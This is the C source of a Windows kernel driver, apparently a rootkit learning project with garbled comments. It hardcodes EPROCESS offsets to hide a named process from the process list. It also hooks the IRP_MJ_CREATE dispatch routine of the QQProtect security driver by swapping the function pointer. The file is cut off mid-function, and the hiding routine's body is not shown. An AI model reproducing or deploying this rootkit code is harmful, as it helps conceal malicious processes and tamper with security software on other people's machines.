#include "ntddk.h"
#include "datatype.h"
#include "dbgmsg.h"
#include "ctrlcode.h"
#include "device.h"
//#include "iomgr.h"

// ʹ�� build  /D /g /b /B /e /F /S /s /$ /why /v /w /y  ������������Դ�ļ�
//#define MEM_TAG  "UseForCopyFile"
// ע�⣺������ͨ��sc.exe�������ں˿ռ�ʱ����ʹ������ʵ�ֵ�ͬ������������ȫ�ֵĻ��������Ȼ������
//Ӳ�������ڲ��������������ض����̣���������ж��ʱ�����ỹԭ��������޸ģ���˲�������Ŀ����̡���Ҫ��д������߼���
// ����ж��ʱ�������صĽ��̣���������ϵͳҲ���ԣ�
//��Ҫ�ڶ��ϵͳ�ϲ��Դ������Ļ�������߼��Ƿ��ܹ�������������֮��ᵼ��bugcheck����

#define IopAllocateOpenPacket()                                              \
    ExAllocatePoolWithTag( NonPagedPool,                                     \
                           sizeof( OPEN_PACKET) ,                              \
                           'pOoI')


#define EPROCESS_OFFSET_PID				0xb4		//�� EPROCESS.UniqueProcessId ��ƫ����Ϊ 0xb4 �ֽ�
#define EPROCESS_OFFSET_NAME				0x16c		//�� EPROCESS.ImageFileName ��ƫ����Ϊ 0x16c �ֽ�
#define EPROCESS_OFFSET_LINKS				0xb8			//�� EPROCESS.ActiveProcessLinks ��ƫ����Ϊ 0xb8 �ֽ�
#define SZ_EPROCESS_NAME					0x010	// ԭʼ�ĵ������У��������ƴ洢�ڳ���Ϊ15���ֽ��ַ������У�
// ����ѳ��ȸ�Ϊ16��Ϊ�˰����һ��Ԫ�ظ�ֵΪ\0��β��־
//��ʵ������ˣ���Ϊ���̼���ʱ���ں˻��Զ���ӳ�����ƽضϳ�14�ֽڣ�Ȼ����䵽 _EPROCESS.ImageFileName[] �ֶΣ�����15�ֽڣ���
//��15�ֽڣ�_EPROCESS.ImageFileName[14]�����Ϊ\0

//extern POBJECT_TYPE* IoDriverObjectType;
//��������������һ�������� ntddk ��δ����ģ��� Windows �ں�ȷʵ���������ǵķ��ţ����ֻ���� extern ���������ɸ�֪��������������



extern POBJECT_TYPE* IoDeviceObjectType;


extern NTSTATUS ObReferenceObjectByName(
	IN PUNICODE_STRING ObjectPath,
	IN ULONG Attributes,
	IN PACCESS_STATE PassedAccessState OPTIONAL,
	IN ACCESS_MASK DesiredAccess OPTIONAL,
	IN POBJECT_TYPE ObjectType,
	IN KPROCESSOR_MODE AccessMode,
	IN OUT PVOID ParseContext OPTIONAL,
	OUT PVOID *ObjectPtr
);



/* MSNetDigaDeviceObject�������Ǵ������豸 */
PDEVICE_OBJECT MSNetDiagDeviceObject;
/* DriverObjectRef��������ע������� */
PDRIVER_OBJECT DriverObjectRef;
KIRQL  RaiseIRQL();
PKDPC  AcquireLock();
NTSTATUS  ReleaseLock(PVOID  dpc_pointer);
void  LowerIRQL(KIRQL  prev);
void  lockRoutine(IN  PKDPC  dpc, IN  PVOID  context, IN  PVOID  arg1, IN  PVOID  arg2);
BYTE*  getNextEPROCESSpointerForProcName(BYTE*  currentEPROCESSpointer);
BYTE*  getPreviousEPROCESSpointerForProcName(BYTE*  currentEPROCESSpointer);
void  getProcessName(char  *dest, char  *src);
unsigned char*  get_proc_name(BYTE*  currentEPROCESSpointer);
void  WalkProcessListWithName(unsigned char* trg_proc_nme);
void  HideProcessWithName(unsigned char* trg_proc_nme);
void  adjustProcessListEntryWithProcName(BYTE*  currentEPROCESSpointer);
void TestCommand(PVOID inputBuffer, PVOID outputBuffer, ULONG inputBufferLength, ULONG outputBufferLength);
NTSTATUS defaultDispatch(IN PDEVICE_OBJECT DeviceObject, IN PIRP Irp);
NTSTATUS dispatchIOControl(IN PDEVICE_OBJECT DeviceObject, IN PIRP Irp);


NTSTATUS RegisterDriverDeviceName(IN PDRIVER_OBJECT DriverObject);
NTSTATUS RegisterDriverDeviceLink();

NTSTATUS ReferenceDeviceAndHookIRPdispatchRoutine();
VOID UnhookIRPdispatchRoutineAndDereferenceDevice();
NTSTATUS InterceptAndInspectOthersIRP(IN PDEVICE_OBJECT DeviceObject, IN PIRP Irp);

//�⼸����Ϊȫ�ֱ����������޷�ͨ�����루�����ֲ�����δ��ʼ����

//����һ��ȫ�ֵĺ���ָ�룬���ҹ������޸ģ��⹳���̻�ԭĿ���������������ض� IRP �ķַ�����

typedef NTSTATUS (*OriginalDispatchRoutinePtr)
(

	IN PDEVICE_OBJECT DeviceObject,
	IN PIRP Irp

);

OriginalDispatchRoutinePtr  ori_dispt_ptr;

typedef struct _OPEN_PACKET {
	CSHORT Type;
	CSHORT Size;
	PFILE_OBJECT FileObject;
	NTSTATUS FinalStatus;
	ULONG_PTR Information;
	ULONG ParseCheck;
	PFILE_OBJECT RelatedFileObject;

	//
	// The following are the open-specific parameters.  Notice that the desired
	// access field is passed through to the parse routine via the object
	// management architecture, so it does not need to be repeated here.  Also
	// note that the same is true for the file name.
	//

	LARGE_INTEGER AllocationSize;
	ULONG CreateOptions;
	USHORT FileAttributes;
	USHORT ShareAccess;
	PVOID EaBuffer;
	ULONG EaLength;
	ULONG Options;
	ULONG Disposition;

	//
	// The following is used when performing a fast query during open to get
	// back the file attributes for a file.
	//

	PFILE_BASIC_INFORMATION BasicInformation;

	//
	// The following is used when performing a fast network query during open
	// to get back the network file attributes for a file.
	//

	PFILE_NETWORK_OPEN_INFORMATION NetworkInformation;

	//
	// The type of file to create.
	//

	CREATE_FILE_TYPE CreateFileType;

	//
	// The following pointer provides a way of passing the parameters
	// specific to the file type of the file being created to the parse
	// routine.
	//

	PVOID ExtraCreateParameters;

	//
	// The following is used to indicate that an open of a device has been
	// performed and the access check for the device has already been done,
	// but because of a reparse, the I/O system has been called again for
	// the same device.  Since the access check has already been made, the
	// state cannot handle being called again (access was already granted)
	// and it need not anyway since the check has already been made.
	//

	BOOLEAN Override;

	//
	// The following is used to indicate that a file is being opened for the
	// sole purpose of querying its attributes.  This causes a considerable
	// number of shortcuts to be taken in the parse, query, and close paths.
	//

	BOOLEAN QueryOnly;

	//
	// The following is used to indicate that a file is being opened for the
	// sole purpose of deleting it.  This causes a considerable number of
	// shortcurs to be taken in the parse and close paths.
	//

	BOOLEAN DeleteOnly;

	//
	// The following is used to indicate that a file being opened for a query
	// only is being opened to query its network attributes rather than just
	// its FAT file attributes.
	//

	BOOLEAN FullAttributes;

	//
	// The following pointer is used when a fast open operation for a fast
	// delete or fast query attributes call is being made rather than a
	// general file open.  The dummy file object is actually stored on the
	// the caller's stack rather than allocated pool to speed things up.
	//

	//PDUMMY_FILE_OBJECT LocalFileObject;

	//
	// The following is used to indicate we passed through a mount point while
	// parsing the filename. We use this to do an extra check on the device type
	// for the final file
	//

	BOOLEAN TraversedMountPoint;

	//
	// Device object where the create should start if present on the stack
	// Applicable for kernel opens only.
	//

	ULONG           InternalFlags;      // Passed from IopCreateFile
	PDEVICE_OBJECT  TopDeviceObjectHint;

} OPEN_PACKET, *POPEN_PACKET;

POPEN_PACKET openPacket;


//����������ȫ�ֱ������ҹ��ͽ⹳�������������Ŀ���������豸����

PFILE_OBJECT			ref_file;
PDEVICE_OBJECT			ref_device;
PDRIVER_OBJECT			ref_driver;


KIRQL  old_irql;


//�����Ϊȫ�ֱ�������������⣬����������� DriverEntry() �ж���
//unsigned char*  target_hide_process_name_null_terminated = ��QQProtect.exe\0��;

//unsigned char*  target_hide_process_name = "QQProtect.exe";
unsigned char*  target_hide_process_name = "Core Temp.exe";
// �����3��ȫ�ֱ��������ڶദ����ϵͳ��ͬ����OS��Դ�ķ���

PKDPC  dpcPointer;		//һ��ָ�룬ָ���� DPC���ӳٹ��̵��ã����󹹳ɵ����飻ÿ������/�˱�����һ���������飻ÿ�������ϵ� DPC
					// ���������� DISPATCH_LEVEL ������˿��Թ���ô�����/�������е� OS���̵߳��ȴ���ʵ��ͬ����
DWORD has_finished_access_os_res;		//����ɶ�OS��Դ��ͬ������ʱ��Ӧ���˱�־��1
DWORD nCPUsLocked;		//��ʶ��ǰ��ͬ���˵ģ������� DISPATCH_LEVEL��CPU/���������˱���Ӧ��ͨ�� InterLocked*() ϵ������ԭ�ӵؽ��ж�д
					// ����һ��λ���ⲿ���Դ�ļ���.../amd64/lib.asm���еĺ�����������ִ�� nop ��ָ��

					// ���ļ�������Ϊ AMD64 ��ϵ�ṹ��ָ���� /amd64 ����ѡ��ʱ�ã�������Ĭ�ϵ� x86/i386 ����ѡ������������ⲿ������
					// ���������������� __asm{nop;}
					

VOID Unload(IN PDRIVER_OBJECT DriverObject)
{
	PDEVICE_OBJECT pdeviceObj;
	UNICODE_STRING unicodeString;
		

	DBG_TRACE("OnUnload", "First remove IRP hook and dereference target device");

	// ж���Լ�ǰ�����Ƴ������˼��ϵĹ��Ӳ������˼ҵ��豸���������˼Ҳ���ж�ء������ж��Ƿ�����ɹ�
	UnhookIRPdispatchRoutineAndDereferenceDevice();

	// Ȼ��ж���Լ�
	DBG_TRACE("OnUnload", "Received signal to unload the driver");
	pdeviceObj = (*DriverObject).DeviceObject;
	if (pdeviceObj != NULL)
	{
		DBG_TRACE("OnUnload", "Unregistering driver's symbolic link");
		RtlInitUnicodeString(&unicodeString, DeviceLinkBuffer);
		IoDeleteSymbolicLink(&unicodeString);
		DBG_TRACE("OnUnload", "Unregistering driver's device name");

		//IoDeleteDevice(pdeviceObj);
		IoDeleteDevice((*DriverObject).DeviceObject);
	}


	


	return;
}


//�ú�������ȥ�����ӣ���ԭ����ʼ�ķַ����̣�Ȼ�������Ŀ���豸����
//��Ϊʵ��ִ�н����õ� ObDereferenceObject() һ���ɹ������޷���ֵ�����������ǵķ�װ����Ҳ���践��ֵ���Ӷ������ǵ�
// unload() �����������жϽ���Ŀ���豸�����Ƿ�ɹ���������

VOID UnhookIRPdispatchRoutineAndDereferenceDevice() {

	//int loop_counter2;

	//�ȼ��ǰ���Ƿ񱣴���ԭʼ�ַ�����
	if (ori_dispt_ptr != NULL) {


		InterlockedExchange
		(

			(PLONG) &((*ref_driver).MajorFunction[IRP_MJ_CREATE]),
			(ULONG)ori_dispt_ptr

		);


	}


	//���û�б��棬��û�йҹ�����ȻҲ���ý⹳����������ú󷵻�

	//����ܹ���ȡ�豸����ָ�룬��ʹ�� IoGetDeviceObjectPointer() ���ص��ļ�������������
	/*if( ref_file != NULL ){
	
		ObDereferenceObject(ref_file);
		ref_file = NULL;

		DBG_TRACE("UnhookIRPdispatchRoutineAndDereferenceDevice", "....hook and reference has been remove....");
		return;
	
	}*/


	//ʹ�� ObReferenceObjectByName() ���صĶ���ָ�루ָ��\Driver\QQProtect����������
	if (ref_device != NULL) {

		ObDereferenceObject(ref_device);
		ref_device = NULL;

		DBG_TRACE("UnhookIRPdispatchRoutineAndDereferenceDevice", "....hook and reference has been remove....");
		return;

	}


	//�޹ҹ��������ã�ori_dispt_ptr == NULL && ref_file == NULL��
	// �����ǰ��� ReferenceDeviceAndHookIRPdispatchRoutine �������豸����ʧ�ܣ�ref_file ����� NULL��
	// ��ôʲô��������ֱ�ӷ��ظ� unload()�����߾Ϳ���ж�������Լ�������

	DBG_TRACE("UnhookIRPdispatchRoutineAndDereferenceDevice", "nothing to do....because reference and hook failure.....");
	return;

}



//�ú�������Ŀ���豸����Ȼ��ҹ��Է��� IRP �ַ�����
//���ǿ��Ը�Ϊ hooked ��Щ����������i8204ptr.sys�������������/д������豸����ַ����̣��������ܹ������շ����������ݰ����û����µİ�����

NTSTATUS	ReferenceDeviceAndHookIRPdispatchRoutine(){

	
	NTSTATUS  ntStatus = STATUS_SUCCESS;
	UNICODE_STRING  deviceName;
	WCHAR  devNameBuffer[] = L"\\Device\\QQProtect";
	

	RtlInitUnicodeString(&deviceName, devNameBuffer);

	openPacket = (POPEN_PACKET)IopAllocateOpenPacket();
	if (openPacket == NULL) {
		DbgPrint("ReferenceDeviceAndHookIRPdispatchRoutine",  "....unable to get target object address due to STATUS_INSUFFICIENT_RESOURCES.....");
	}
	
	openPacket->Type = IO_TYPE_OPEN_PACKET;
	openPacket->Size = 0x70;


	ntStatus = ObReferenceObjectByName

	(	&deviceName,
		OBJ_CASE_INSENSITIVE,
		NULL,
		0,
		*IoDeviceObjectType,
		KernelMode,
		openPacket,
		&ref_device
	);
	
	if( !NT_SUCCESS(ntStatus) ){
	
		DBG_TRACE("ReferenceDeviceAndHookIRPdispatchRoutine", "Get Device Object Pointer Failure !" );
		DBG_PRINT2("[ReferenceDeviceAndHookIRPdispatchRoutine]: the pointer 'ref_device'points to  %p\n", *ref_device);
		DBG_PRINT2("[ReferenceDeviceAndHookIRPdispatchRoutine]: the NTSTATUS code is:  %p\n", ntStatus);
		DBG_PRINT2("[ReferenceDeviceAndHookIRPdispatchRoutine]: the NTSTATUS code in Hexadecimal is:  0x%08X\n", ntStatus);
		return (ntStatus);

	}


	ref_driver =  (*ref_device).DriverObject;

	//���ǽ����沢 hook Ŀ���������ڴ��� IRP_MJ_DEVICE_CONTROL ���� IRP �ķַ�����(���е� 15 ������ָ��) 
	// ���� QQProtect.sys ����ʼ���Լ��� IRP_MJ_CREATE ��IRP_MJ_CLOSE �����̣��������ѡ��һ�� hook
	//[IRP_MJ_DEVICE_CONTROL]
	ori_dispt_ptr =  (*ref_driver).MajorFunction[IRP_MJ_CREATE];

	if (ori_dispt_ptr != NULL) {


		InterlockedExchange
		(

			(PLONG) &((*ref_driver).MajorFunction[IRP_MJ_CREATE]),
			(ULONG)InterceptAndInspectOthersIRP

		);
	}
		

		DBG_TRACE("ReferenceDeviceAndHookIRPdispatchRoutine", "....... Hook target dispatch routine success ........");

		//Ϊ����֤�Ƿ�ɹ� hook���������Ǽ�������жϣ�Ȼ���Ե�������� tdx.sys �ַ����̱��еĵ�15������ָ�룬�ַ����̱�λ��
		// ��������ƫ�� 0x38 �ֽڴ������ϸ�ƫ�������� dps ת�����ں���������Ϊ������ 0x0 ��ʼ,����±�[0xe] �ǵ�15������ָ��
		// �Ժ��ڼ���ִ�в���������� sc.exe ж������ʱ���ٴζ�������������������Ƿ��ѱ���ԭ��
		// �ҹ���
		// kd> dps [(866add30+0x38)+ 0xe*4] L2
		//	866adda0  9300f260 hideprocess!InterceptAndInspectOthersIRP
		//	866adda4  90c6c2be tdx!TdxTdiDispatchInternalDeviceControl


		//�⹳��
		//kd> dps [(866add30+0x38)+ 0xe*4] L2
		//	866adda0  90c6d332 tdx!TdxTdiDispatchDeviceControl
		//	866adda4  90c6c2be tdx!TdxTdiDispatchInternalDeviceControl
		__asm {
			int 3;
		}


		return (STATUS_SUCCESS);

	

	//������ԭʼ�ַ�����ʧ�ܣ����ǾͲ��� hook ����Ϊ�޷���ԭ�������ۼ�����Υ���� rootkit ��ԭ��֮һ��
	// ������ѡ��һ������

	
	//return  (STATUS_ASSERTION_FAILURE);
	return  (!STATUS_SUCCESS);
			
}




//��������ô����̹�ס��QQProtect.sys �� IRP_MJ_CREATE �ַ����̣���ôҪ��δ�����Ӧ�� IRP �͵������⴦���أ�
// ���ϵͳ�������� QQProtect.exe ������رգ�Ȼ������ qq.exe �����̣����߻���ǰ���Ƿ���ڣ����û�оͻᴴ�� QQProtect.exe
// �˿̾ͻ��� I/O ���������󴴽� IRP_MJ_CREATE IRP�����մ��ݵ��������д��������ڴ������м�������ϵ㣬���Լ�鴫��� IRP��
// �����Ա�̷�ʽ���Ҳ��
NTSTATUS InterceptAndInspectOthersIRP(IN PDEVICE_OBJECT DeviceObject, IN PIRP Irp){

	PIO_COMPLETION_ROUTINE original_completion_routine;
	PIO_STACK_LOCATION check_target_irp_Stack;
	ULONG ioctrlcode;

	DBG_TRACE("InterceptAndInspectOthersIRP",  "Get an IRP destined to original driver��now we can dump and modify it");

	// �˴�����ת������ȡ���Լ��޸� IRP �Ĺ������ɲο� dispatchIOControl() �в��� IRP ���߼�����ע��ܿ��豸ջ�������Щ�ؼ��ֶ�
	
	
	// Ϊ���ȶ��ԣ�һ�����ǣ���������ֻ����ĳ�豸����ר�õ� IO_STACK_LOCATION �ṹ���� I/O ����������������� IRP �и��ֶ�
	// ����;���������
	// ��ȡ I/O �������� IRP ���ݸ��������� tdx.sys �������豸���� \Device\Tcp ʱ�����豸ר�õ� IO_STACK_LOCATION��
	// ʵ���ϣ�\Device\Tcp  ���ڵ��豸ջ�У�ֻ��һ���豸���༴  \Device\Tcp ��
	//kd> !devstack  \Device\Tcp
	//!DevObj   !DrvObj            !DevExt   ObjectName
	//> 866b96b0  \Driver\tdx        866b9768  Tcp
	
	
	check_target_irp_Stack = IoGetCurrentIrpStackLocation(Irp);
	
	//�ٴ�ȷ�����ǹ�ס������� IRP ����Ϊ IRP_MJ_DEVICE_CONTROL
	if (check_target_irp_Stack->MajorFunction != IRP_MJ_CREATE) {

		return (!STATUS_SUCCESS);

	}

	//��ǰ�������ɾ�ϵͳ�У��豸���� \Device\Tcp ���ڵ��豸ջ��ֻ�����Լ���������֤��DeviceObject.AttachedDevice Ϊ���ص� 
	// \Device\Tcp ���豸����Ӧ��Ϊ�գ�
	if( check_target_irp_Stack->DeviceObject->AttachedDevice == NULL ){
		
		DBG_TRACE("InterceptAndInspectOthersIRP",  "we have no others rootkit monitoring QQProtect.sys's devStack !");
	
	}

	//�������  \Device\Tcp �豸�����������̣������ӡ��ַ���Է�������ڵ������з����ú���
	if ( (original_completion_routine = check_target_irp_Stack->CompletionRoutine) != NULL ) {
	
		DBG_PRINT2("[InterceptAndInspectOthersIRP]: address of IO_STACK_LOCATION.Completion Routine is:  %p\n", original_completion_routine);
	
	}
	else
	{
		DBG_TRACE("InterceptAndInspectOthersIRP", "the QQProtect.sys doesn't supply a Completion Routine to its device object!");
	}

	// ��Ϊ���� hooked ���Ǵ��ݸ� \Device\Tcp �豸����� IRP_MJ_DEVICE_CONTROL ���� IRP��������Ҫ������� I/O �����룬Ȼ�����
	// ��Ӧ�Ĳ����� IO_STACK_LOCATION.Parameters.DeviceIoControl �ֶ�ר���ڼ�¼ IRP_MJ_DEVICE_CONTROL ���� IRP �������Ϣ
	// ���Ƶأ���� IRP ������Ϊ IRP_MJ_WRITE���� IO_STACK_LOCATION.Parameters �ֶ��µ����Ͻ��� I/O ��������ʼ��Ϊ Write
	// ����֮��I/O ���������� IRP ����������ʼ�� IO_STACK_LOCATION.Parameters �µ�����

	
	ioctrlcode = (*check_target_irp_Stack).Parameters.DeviceIoControl.IoControlCode;

	DbgPrint(".........the IO control code sent to QQProtect.sys's dispatch routine is   %u  ........", ioctrlcode);

	DBG_TRACE("InterceptAndInspectOthersIRP",  "forward IRP to the original dispatch routine, to guarantee system work correctly");

	// ͨ������ָ�����ԭʼ�ַ����̣�ת���������д�����ȷ��ϵͳ�ܹ�������������Ϊ���ǵĹ������̴���Ŀ�� IRP �ķ�ʽ
	// �����ϵͳ���豸ջ�зַ����̷�Ԥ�ڵģ��Ϳ������ϵͳ����

	return ( ori_dispt_ptr(DeviceObject, Irp) );

}





/*
* DriverObject�൱��ע���������DeviceObjectΪ��Ӧĳ�������豸
* һ���������Դ�������豸��Ȼ��ͨ��DriverObject::DeviceObject��
* DeviceObject::NextDevice���������豸����
*/
NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath)
{
	//��Ϊ DriverEntry() ������ PASSIVE_LEVEL �жϼ�������ֻ���� PASSIVE_LEVEL ���õ��ں����̶�Ӧ�÷��� DriverEntry()
	//�ڲ����ã�����ʹ�� DbgPrint() ��ӡ unicode �ַ���ʱ
	// ����ȷ��ԭ�Ӳ��� InterLockedAndExchange() �Ƿ�ֻ���� PASSIVE_LEVEL IRQL �ϵ���
	//  WDK �ж���Ĳ������������봫ͳ C ��׼���������Ͷ�Ӧ��ϵ���£�
	// �����Щ���Ͷ�����ͨ�� #define ���� typedef ʵ��
	// ULONG -> unsigned long
	// UCHAR -> unsigned char
	// UINT -> unsigned int
	// VOID -> void 
	// PULONG ->unsigned long* 
	// PUCHAR -> unsigned char*
	// PUINT -> unsigned int*
	// PVOID -> void*

	
	LARGE_INTEGER clock_interval_count_since_booted;
	//���е��ڲ��������������ȶ���
	int i;						//������������ǰ�棬�����޷�ͨ������
	ULONG  millsecond_count_per_clock;
	ULONG  l00nanosecond_count_per_clock;
	NTSTATUS  ntStatus;	//������������ǰ�棬�����޷�ͨ������
	ULONG  data_length;
	HANDLE  my_key_handle = NULL;
	NTSTATUS  returnedStatus;
	NTSTATUS  hooked_result;		//�������ǵĹҹ����̵�ִ�н��

	UNICODE_STRING  my_key_path = RTL_CONSTANT_STRING(L"\\Registry\\Machine\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion");
	UNICODE_STRING  my_key_name = RTL_CONSTANT_STRING(L"SystemRoot");
	KEY_VALUE_PARTIAL_INFORMATION  not_complete_key_infor;
	PKEY_VALUE_PARTIAL_INFORMATION  acturally_use_key_infor;
	ULONG  acturally_key_value_length;
	OBJECT_ATTRIBUTES   my_obj_attr;
	InitializeObjectAttributes(&my_obj_attr, &my_key_path, OBJ_CASE_INSENSITIVE, NULL, NULL);
	returnedStatus = ZwOpenKey(&my_key_handle, KEY_READ, &my_obj_attr);
	if (!NT_SUCCESS(returnedStatus)) {
		DBG_TRACE("Driver Entry", ".................cannot open registry key...........");
	}

	returnedStatus = ZwQueryValueKey(my_key_handle,
		&my_key_name,
		KeyValuePartialInformation,
		&not_complete_key_infor,
		sizeof(KEY_VALUE_PARTIAL_INFORMATION),
		&acturally_key_value_length);

	if (!NT_SUCCESS(returnedStatus)
		&& returnedStatus != STATUS_BUFFER_OVERFLOW
		&& returnedStatus != STATUS_BUFFER_TOO_SMALL) {
		DBG_TRACE("Driver Entry", ".................you pass the wrong arg or the key value...........");
	}

	acturally_use_key_infor = (PKEY_VALUE_PARTIAL_INFORMATION)ExAllocatePoolWithTag(NonPagedPool, acturally_key_value_length, 'MyTg');
	if (acturally_use_key_infor == NULL) {
		returnedStatus = STATUS_INSUFFICIENT_RESOURCES;
		DBG_TRACE("Driver Entry", "..........................cannot allocate kernel mode heap memory.........................");
	}

	returnedStatus = ZwQueryValueKey(my_key_handle,
		&my_key_name,
		KeyValuePartialInformation,
		acturally_use_key_infor,
		acturally_key_value_length,
		&acturally_key_value_length);

	if (NT_SUCCESS(returnedStatus)) {
		for (data_length = 0; data_length < acturally_use_key_infor->DataLength; data_length++) {
			DbgPrint("the SystemRoot=   %c\n", acturally_use_key_infor->Data[data_length]);
		}


	}
	else {
		DBG_TRACE("Driver Entry", ".................query registry key value failed......................");
	}
	//ע�⣬DbgPrint ���̲�֧���κθ������ͣ�%f��%e��%E��%g��%G��%a �� %A������˴�ӡ�����������ϵͳ����
	l00nanosecond_count_per_clock = KeQueryTimeIncrement();
	millsecond_count_per_clock = l00nanosecond_count_per_clock / 10000;
	DbgPrint("................per system clock interval is   %u   100nanoseconds................", l00nanosecond_count_per_clock);

	DbgPrint("................per system clock interval is   %u   millseconds...............", millsecond_count_per_clock);
	KeQueryTickCount(&clock_interval_count_since_booted);
	DbgPrint(".............  the system clock interval count since booted is   %u  times  ...................", clock_interval_count_since_booted.LowPart);
	DbgPrint(".............  the higher 4 bytes of clock_interval_count_since_booted is   %i  times  ...................", clock_interval_count_since_booted.HighPart);
	//ϵͳ�жϴ�������ÿ�жϵĺ������͵õ��������������ĺ�����


	HideProcessWithName(target_hide_process_name);

	DBG_TRACE("Driver Entry", "Driver has benn loaded");
	for (i = 0; i<IRP_MJ_MAXIMUM_FUNCTION; i++)
	{
		//��Ϊ���� _DRIVER_OBJECT.MajorFunction : [28] Ptr32 to     long
		// ���������� 0��27��IRP_MJ_MAXIMUM_FUNCTION��

		// ��������Ϊ PDRIVER_OBJECT DriverObject�����Խ�����ȡ�� DRIVER_OBJECT
		
		(*DriverObject).MajorFunction[i] = defaultDispatch;
		
		// �ȼ���	
		//DriverObject->MajorFunction[i]
	}

	//�ȼ��� DriverObject->MajorFunction[14] = dispatchIOControl;
	// ��dispatchIOControl()ע��Ϊ�����豸������ IRP ������
	(*DriverObject).MajorFunction[IRP_MJ_DEVICE_CONTROL] = dispatchIOControl;
	(*DriverObject).DriverUnload = Unload;


	//MajorFunction[IRP_MJ_READ]  ���� MajorFunction[3] ���������Ԥ��Ҫ�������������͵� IRP����  
	// I/O ������Ϊ���´��ݵ� IRP ���书�ܴ���Ϊ IRP_MJ_READ���� IRP ����һ���ջ��������ṩ����������Ѵ��豸�ж�ȡ�����ݷ���
	// ���棬 ��� _DRIVER_OBJECT.MajorFunction[3] һ�㱻��ʼ��Ϊ��������� IRP ������
	// ���Ƶأ�_DRIVER_OBJECT.MajorFunction[4] Ҳ���� MajorFunction[IRP_MJ_WRITE] һ�㱻��ʼ��Ϊ����д���� IRP ��IRP_MJ_WRITE��
	// �����̣���ʱ I/O ���������ݵ� IRP �������ڰ������ݣ������������������豸д�� 

	//ǰ���ȳ�ʼ���Լ��� IRP �ַ����̱�Ȼ��ҹ����Ǹ���Ȥ������������ IRP �ַ����̱�

	hooked_result = ReferenceDeviceAndHookIRPdispatchRoutine();

	// �ҹ�ʧ�ܣ����ӡ��Ϣ

	if( !NT_SUCCESS(hooked_result) ){

	DBG_TRACE("Driver Entry", "Reference Device And Hook Failure ! We can only check ourself IRP !");
	
	}

	DBG_TRACE("Driver Entry", "Registering driver's device name");
	ntStatus = RegisterDriverDeviceName(DriverObject);
	if (!NT_SUCCESS(ntStatus))
	{
		DBG_TRACE("Driver Entry", "Failed to create device");
		return ntStatus;
	}

	DBG_TRACE("Driver Entry", "Registering driver's symbolic link");
	ntStatus = RegisterDriverDeviceLink();
	if (!NT_SUCCESS(ntStatus))
	{
		DBG_TRACE("Driver Entry", "Failed to create symbolic link");
		return ntStatus;
	}
	DriverObjectRef = DriverObject;
	return STATUS_SUCCESS;
}
/*
* IRP.IoStatus : ����ΪIO_STATUS_BLOCK
* A driver sets an IRP's I/O status block to indicate the final status of
* an I/O request, before calling IoCompleteRequest for the IRP.
typedef struct _IO_STATUS_BLOCK {
union {
NTSTATUS Status;
PVOID    Pointer;
};
ULONG_PTR Information;
} IO_STATUS_BLOCK, *PIO_STATUS_BLOCK

Status: This is the completion status, either STATUS_SUCCESS if the
requested operation was completed successfully or an informational,
warning, or error STATUS_XXX value.
Information: This is set to a request-dependent value. For example,
on successful completion of a transfer request, this is set
to the number of bytes transferred. If a transfer request is
completed with another STATUS_XXX, this member is set to zero.

*/



NTSTATUS defaultDispatch(IN PDEVICE_OBJECT DeviceObject, IN PIRP IRP)
{
	((*IRP).IoStatus).Status = STATUS_SUCCESS;
	((*IRP).IoStatus).Information = 0;
	/*
	The IoCompleteRequest routine indicates that the caller has
	completed all processing for a given I/O request and is
	returning the given IRP to the I/O manager.
	*/
	IoCompleteRequest(IRP, IO_NO_INCREMENT);
	return (STATUS_SUCCESS);
}
/*
* I/O��ջ��Ԫ��IO_STACK_LOCATION���壬ÿһ����ջ��Ԫ����Ӧһ���豸����
* ����֪������һ�����������У����Դ���һ�������豸���󣬶���Щ�豸����
* ����Ӧ��һ��IO_STACK_LOCATION�ṹ�壬�������������еĶ���豸���󣬶�
* ��Щ�豸����֮��Ĺ�ϵΪˮƽ��ι�ϵ��
* Parameters Ϊÿ�����͵� request �ṩ���������磺Create(IRP_MJ_CREATE ���󣩣�
* Read��IRP_MJ_READ ���󣩣�StartDevice��IRP_MJ_PNP ������ IRP_MN_START_DEVICE��
*
//
// NtDeviceIoControlFile ����
//
struct
{
ULONG OutputBufferLength;
ULONG POINTER_ALIGNMENT InputBufferLength;
ULONG POINTER_ALIGNMENT IoControlCode;
PVOID Type3InputBuffer;
} DeviceIoControl;
��DriverEntry�����У���������dispatchIOControl����IRP_MJ_DEVICE_CONTROL
���͵����������dispatchIOControl�У�����ֻ����IOCTL����Parameters��
ֻ����DeviceIoControl��Ա
*/



NTSTATUS dispatchIOControl(IN PDEVICE_OBJECT DeviceObject, IN PIRP IRP)
{
	PIO_STACK_LOCATION irpStack;
	PVOID inputBuffer;
	PVOID outputBuffer;
	ULONG inBufferLength;
	ULONG outBufferLength;
	ULONG ioctrlcode;
	NTSTATUS ntStatus;
	ntStatus = STATUS_SUCCESS;
	((*IRP).IoStatus).Status = STATUS_SUCCESS;
	((*IRP).IoStatus).Information = 0;
	inputBuffer = (*IRP).AssociatedIrp.SystemBuffer;
	outputBuffer = (*IRP).AssociatedIrp.SystemBuffer;
	irpStack = IoGetCurrentIrpStackLocation(IRP);
	inBufferLength = (*irpStack).Parameters.DeviceIoControl.InputBufferLength;
	outBufferLength = (*irpStack).Parameters.DeviceIoControl.OutputBufferLength;
	ioctrlcode = (*irpStack).Parameters.DeviceIoControl.IoControlCode;

	DBG_TRACE("dispatchIOControl", "Received a command");
	switch (ioctrlcode)
	{
	case IOCTL_TEST_CMD:
	{
		TestCommand(inputBuffer, outputBuffer, inBufferLength, outBufferLength);
		((*IRP).IoStatus).Information = outBufferLength;
	}
	break;
	default:
	{
		DBG_TRACE("dispatchIOControl", "control code not recognized");
	}
	break;
	}
	/* �ڴ���������󣬵���IoCompleteRequest */
	IoCompleteRequest(IRP, IO_NO_INCREMENT);
	return(ntStatus);
}



void TestCommand(PVOID inputBuffer, PVOID outputBuffer, ULONG inputBufferLength, ULONG outputBufferLength)
{
	char *ptrBuffer;
	DBG_TRACE("dispathIOControl", "Displaying inputBuffer");
	ptrBuffer = (char*)inputBuffer;
	DBG_PRINT2("[dispatchIOControl]: inputBuffer=%s\n", ptrBuffer);
	DBG_TRACE("dispatchIOControl", "Populating outputBuffer");
	ptrBuffer = (char*)outputBuffer;
	ptrBuffer[0] = '!';
	ptrBuffer[1] = '1';
	ptrBuffer[2] = '2';
	ptrBuffer[3] = '3';
	ptrBuffer[4] = '!';
	ptrBuffer[5] = '\0';
